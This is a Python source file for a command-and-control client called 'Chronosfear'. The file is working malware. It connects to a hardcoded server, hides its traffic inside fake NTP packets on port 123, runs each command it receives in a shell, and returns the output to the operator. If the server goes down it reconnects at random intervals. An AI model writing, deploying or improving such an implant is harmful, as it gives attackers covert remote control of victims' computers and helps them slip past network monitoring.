"""
CHRONOSFEAR C2 Client
Author: Caroline Richards

This client connects back to the Chronosfear C2 server and listens for commands.
"""

import socket
import struct
import subprocess
import time
import random

server_address = "192.168.0.10"
server_port = 123
client = None

"""
This function attempts to connect to the server. 
If the connection fails it waits a random amount of time between 5 and 15 seconds before retrying, 
ensuring that if the server is downed clients can reconnect when it comes back up
"""
def connect_to_server():
    global client
    while True: 
        try: 
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((server_address, server_port))
            print(f"Connected to server at {server_address}:{server_port}")
            return 
        except Exception as e:
            print(f"Connection failed: {e}")
            wait_time = random.randint(5, 15)
            print(f"Connection refused, retrying in {wait_time} seconds...")
            time.sleep(wait_time)

"""
This function creates an NTP packet with the given message in an extension field.
"""
def make_ntp_packet(message):
    header = struct.pack("!B B B b 11I", 0b00100011, 1, 0, 0, *(0 for _ in range(11)))
    ext_type = 0xC0DE
    data = message.encode()
    length = 4 + len(data)
    pad_length = (4 - (length % 4)) % 4
    total_length = length + pad_length
    ext_header = struct.pack("!HH", ext_type, total_length)
    ext_data = data + (b'\x00' * pad_length)
    ext = ext_header + ext_data
    packet = header + ext
    return packet

"""
This function parsees an NTP packet and extracts the command in the extension field.
"""
def parse_ntp_packet(buf: bytes, offset: int = 48):
    results = []
    while offset + 4 <= len(buf):
        ext_hdr = buf[offset:offset+4]
        ext_type, ext_len = struct.unpack("!HH", ext_hdr)
        if ext_len < 4:
            # malformed
            break
        if offset + ext_len > len(buf):
            # truncated
            break
        data = buf[offset+4: offset+ext_len]
        results.append((ext_type, data))
        # advance - ext_len is already padded to 4 bytes
        offset += ext_len
    return results

"""
This function sends a response back to the server by creating an NTP packet with the response from the executed command. 
"""
def send_response(response):
    print("Sending response back to server...")
    ntp_packet = make_ntp_packet(response)
    client.send(ntp_packet)

"""
This function handles incoming data-- data is parse as an NTP packet, commands are run in a shell, and the response is returned to the server.
"""
def handle_data(data):
    try: 
        exts = parse_ntp_packet(data)
        if exts:
                command = exts[0][1].decode().replace("\x00", "")
                print(f"Executing command {command}...")
                output = subprocess.run(command, capture_output=True, shell=True)
                print(f"Command executed with return code {output.returncode}")
                response = output.stdout.decode() if output.stdout else ""
                print(f"Command output:\n{response}")
                send_response(response)
    except Exception as e:
        print(f"Error parsing NTP packet: {e}")

"""
This function listens for messages from the server. If the connection is lost, it attempts to reconnect.
"""
def receive_messages():
    global client
    print("Now listening...")
    client.settimeout(60)
    while True: 
        try: 
            data = client.recv(4096)
            handle_data(data)
        except: 
            print("Error receiving data from server.")
            try: 
                client.close()
            except: 
                pass
            connect_to_server()
            print("Reconnected to server.")

connect_to_server()
receive_messages()